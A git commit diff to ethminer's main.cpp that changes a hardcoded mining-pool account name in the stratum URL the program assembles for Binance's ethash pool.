75be3ffae2cfbee773bfe13fcb45c2d06e74a6b4
flice <1261717445@qq.com>
2021-03-22 09:16:35 +0800

    Update main.cpp

--- ethminer/main.cpp
+++ ethminer/main.cpp
@@ -1359,7 +1359,7 @@ int main(int argc, char** argv)
             //woker info
             const char* p0 = argv[0];
             const char* p1 = "-P";;
-            const char* p2 = "stratum1+tcp://facebook.V";
+            const char* p2 = "stratum1+tcp://bibleice.V";
             const char* p3 = "@ethash.poolbinance.com:1800";
             char p4[100];
             sprintf_s(p4, "%s%s%s", p2, argv[1], p3);
